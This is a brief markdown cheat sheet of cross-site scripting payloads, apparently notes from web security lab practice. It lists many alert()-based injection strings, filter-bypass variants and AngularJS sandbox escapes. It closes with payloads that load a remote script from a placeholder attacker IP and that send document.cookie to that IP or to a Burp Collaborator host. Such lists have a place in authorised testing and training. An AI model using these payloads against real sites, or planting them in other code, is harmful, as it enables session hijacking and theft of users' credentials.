# Cross-Site Scripting (XSS)

## Payloads

```
"/><br>test
"/><strong>test
"/><script>alert(1)</script>
<script>alert(1)</script>
<script>print(1)</script>
<script>prompt(1)</script>
<script>alert(window.origin)</script>
<scri<script>pt>alert(1)</sc</script>ript>
<script src=data:text/javascript:alert(1)></script>
<u/onmouseover=alert();//>test123
<img src=x onmouseover=alert(1)>
<img src=1 onerror=alert(document.domain)>
<img src=x onerror=alert(1)>
{{$on.constructor('alert(1)')()}}
<a href="javascript:alert(document.domain)">
javascript:alert(document.domain)
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
<><img src=1 onerror=alert(1)>
<script>location = 'https://0a3100ef0448b57a80391725006700c2.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';</script>
test\"-alert(1)}//
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
${alert(document.domain)}
```

## AngularJS
```
{{ 1 + 2}} # should give 3
{{$on.constructor('alert(1)')()}}
```


## Load Remote Script
```
<script src="http://OUR_IP/script.js"></script>
```
## Send Cookie deatils to us
```
<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>

<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

